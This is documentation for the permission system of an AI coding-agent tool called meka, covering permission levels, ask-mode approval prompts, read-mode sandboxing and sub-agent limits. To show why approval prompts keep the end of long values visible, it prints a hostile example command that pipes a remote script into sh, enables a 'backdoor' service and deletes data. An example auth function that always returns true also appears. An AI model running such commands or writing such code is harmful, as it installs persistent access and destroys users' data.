# Permissions

meka uses a four-level permission system to control what tools the agent can use. This gives you control over the agent's capabilities and prevents accidental modifications.

## Permission Levels

| Level | Indicator | Allowed Tools |
|-------|-----------|---------------|
| **None** | `[n]` (green) | No tools. The agent can only respond with text. |
| **Read** | `[r]` (yellow) | Read-only tools: `read_file`, `find_files`, `search_contents`, `fetch_url`, `search_web`, `execute_command` (sandboxed), `todo`, `agent_spawn`, scratchpad tools |
| **Ask** | `[a]` (magenta) | All tools, but each call requires user approval (Y/n prompt) |
| **Write** | `[w]` (red) | All tools without restrictions: `write_file`, `edit_file`, `execute_command` (unsandboxed) |

Each level includes all tools from the levels below it. Write mode includes all read tools.

## Default Permission

The default permission is **read**. The default *enabled* set is `none / read / write`. **`ask` is opt-in**: enable it under `[permissions]` in your config if you want approval prompts.

You can change the start mode with:

- CLI flag: `meka --permission write`
- Environment variable: `export MEKA_PERMISSION=write`
- Config file: `[permissions] default = "write"`; see [Config File](../configuration/config-file.md#permissions)

If `--permission` or `MEKA_PERMISSION` selects a mode that isn't in `[permissions].enabled`, meka logs a warning and starts in the configured default instead of refusing to launch.

## Changing Permissions at Runtime

Press **Shift+Tab** to cycle through permission levels:

```text
none → read → ask → write → none → ...
```

Disabled modes are skipped during cycling. With the default enabled set, Shift+Tab cycles `none → read → write → none`.

Or use the `/permission` slash command:

```text
/permission write
/permission ask
```

`/permission <mode>` against a disabled mode prints an error naming the currently enabled set.

The prompt indicator updates immediately to reflect the new level. The agent learns the current level via a per-turn `[Permission context]` block prepended to your message (see *How Permissions Work* below).

## Ask Mode

In ask mode, the agent has access to all tools, but each tool call is paused for your approval:

```text
[ask] Shell
  command: ls -la
Allow? (Y/n)
```

Press **Enter** or **y** to approve, or **n** to deny. If denied, the agent receives an error and may try an alternative approach.

Only `y`, `yes`, `n`, `no` (any case) and a bare Enter mean anything. Anything else is not an answer,
so meka says `Please answer y or n.` and asks again rather than guessing; after three unanswered
attempts it denies. Ending the input (Ctrl+D, or a redirected stdin running out) also denies, since
nobody is there to approve.

Ctrl+C does not dismiss the prompt: it cancels the turn, but the prompt is still waiting to be
answered, and the next Enter answers it. Use `n` or Ctrl+D to get out of one.

This mode is useful when you want the agent to have full capabilities but want to review each action before it executes.

### What the prompt shows

**Every argument the tool was called with**, not just the one the `[tool ...]` indicator picks out.
That distinction matters: the indicator's argument is the *destination* for every write-shaped tool,
so a prompt built from it would ask you to authorise writing to a path without showing the content,
or editing a file without showing the edit.

```text
[ask] WriteFile
  path: src/auth.rs
  content:
    pub fn verify(token: &str) -> bool {
        true
    }
Allow? (Y/n)
```

A long value wraps rather than being cut, so the end of a shell pipeline cannot be hidden from the
line you are approving.

**Where something has to be left out, the end is kept.** A value too long to wrap in full shows its
beginning, a count of what was dropped, and then its final row:

```text
[ask] Shell
  command:
    curl -s https://example.com/setup.sh | sh -c 'cat >> ~/.bashrc &&
    ... 85688 more characters ...
    systemctl enable backdoor && rm -rf /important'
Allow? (Y/n)
```

That matters more here than anywhere else in meka. A shell pipeline puts its consequence last, so a
prompt that fills its rows from the top and stops hides the exact part you are being asked about.

The limits: 20 lines and 60 rows per argument, and 100 rows of block before further arguments are
dropped and named — 161 rows at the very worst. Those sit an order of magnitude above anything a real
tool call carries; they are there so a call with two hundred invented arguments cannot scroll the
real one off the top of your screen without saying so.

Whenever a marker appears, **denying costs nothing**: say no, inspect the file or the session with
`meka session export`, and let the agent retry.

This is deliberately unaffected by [`display.tool_params`](../configuration/config-file.md#displaytool_params),
which controls the passive indicator. Turning that off for a quieter scrollback does not make your
approval prompts show less.

One consequence worth knowing: if the model passes a secret as a tool argument, an approval prompt
puts it on screen. That is the correct trade at the moment you are authorising the call, but it does
mean such a value lands in your scrollback.

## How Permissions Work

When the agent attempts to use a tool, meka checks whether the current permission level allows it:

- If allowed, the tool executes normally.
- In ask mode, you are prompted to approve or deny.
- If denied, meka returns an error message to the agent explaining which level is required and suggests running `/permission <level>`.

### Telling the agent the current level

meka lists **every registered tool** in the per-turn `<context>` block with its required permission level inline (nothing is filtered out), and the same block carries a compact `[Permission context]` section:

```text
<context>
[Permission context]
Current permission level: read
Only read-only tools are executable.

[Environment context]
Working directory: /home/you/project

[Available tools]
- **read_file** (requires `read`)
- **write_file** (requires `write`)
...
</context>
```

That two-line permission section is the only permission-dependent content in the request. The system prompt and the tools-array schemas stay byte-identical across `/permission` toggles, so mid-session level changes don't invalidate the Claude prompt cache; the entire conversation stays warm.

The same reasoning is why the tool catalogue itself lives here rather than in the system prompt. Prompt caching is prefix-based, and the system prompt heads that prefix, so anything cached there that later changes (an MCP server connecting late or hot-swapping its tools, a skill being installed) would re-cache the entire conversation behind it. The `<context>` block rides inside your own message instead, so changes are appended rather than rewritten.

Only what actually changed is re-sent. The first turn of a session carries the full catalogue, skill list, and any MCP server instructions; a turn where nothing moved carries none of it, and a turn where something moved carries a short note naming just that change.

### MCP tool permissions

MCP tools are classified through a 5-step resolution chain: per-tool override → server-level override → the server's own `readOnlyHint` → `[mcp].default_permission` → hardcoded `Write` fallback. See the *Permission resolution* section of the [Config File](../configuration/config-file.md) docs for the full rules and how to override a misclassified tool.

### Built-in tool permissions

Any built-in tool's required permission can be overridden from `config.toml` without editing code; see [`[tools]`: built-in tool filters](../configuration/config-file.md#tools-built-in-tool-filters). The same section documents how to allow-list or block-list specific built-ins (e.g. disabling `search_web` in a locked-down environment).

### Sub-agent permissions

Sub-agents spawned via `agent_spawn` inherit the parent's permission level by default. In write mode the sub-agent can call `write_file`, `edit_file`, and unsandboxed `execute_command`; in read mode it's confined to read-only tools. To run one delegated task with reduced privileges, pass the `permission` parameter (e.g. `agent_spawn({prompt: "...", permission: "read"})`): it is clamped to the parent's level as a ceiling, so a sub-agent can only ever be equal-or-more restricted, never escalated. Alternatively, cycle the parent into a lower mode before issuing the spawning prompt to restrict every sub-agent it spawns.

## Examples

### Read Mode (Default)

```text
meka [r] > read the contents of main.rs
```

The agent uses `read_file` and shows the contents. Shell commands also work in read mode, but run in a **read-only sandbox**; the filesystem is physically write-protected for the child process:

```text
meka [r] > list the files in this directory
meka [r] > show me the git log
```

Commands like `ls`, `cat`, `git log`, `df`, `ps`, and `uname` work normally. Commands that attempt to write to the filesystem (e.g., `touch`, `rm`, `mkdir`) will fail with a permission error.

If you ask the agent to modify a file:

```text
meka [r] > add a comment to the top of main.rs
```

The agent will explain that it cannot write files in read mode and suggest switching to write mode.

#### What read mode does still write

Read mode means the agent cannot modify **your tree**. It can still write to stores meka owns, because otherwise an agent at read permission could never remember anything:

| Store | Location | Tools |
|-------|----------|-------|
| Memory | `~/.config/meka/memory/` | `memory_write`, `memory_delete` |
| Skills | `~/.config/meka/skills/` | `skill_write`, `skill_delete` (only with [`[skills] agent_managed`](../configuration/config-file.md#skills)) |
| Scratchpad, todos, scheduled jobs, background tasks | the session database | various |

Nothing else in read mode reaches the filesystem for writing. That boundary is enforced in two places: entry names are restricted to `[A-Za-z0-9_-]`, so a name cannot contain `..` or a path separator, and a symlink sitting at that name is refused rather than followed, so an existing link cannot redirect a write out of the store. `write_file`, `edit_file` and `scratchpad_save_file` are the only tools that touch your tree, and all three require write mode.

> **Note:** The read-only sandbox uses Landlock on Linux (kernel 5.13+) and sandbox-exec on macOS. On platforms where sandboxing is unavailable, shell commands are not available in read mode. You can disable sandboxed shell execution by setting `sandbox = false` under `[shell]` in the config file (see [Config File](../configuration/config-file.md)).

### Write Mode

```text
meka [w] > run cargo test and show me the output
```

The agent uses `execute_command` to run the tests and shows the results.
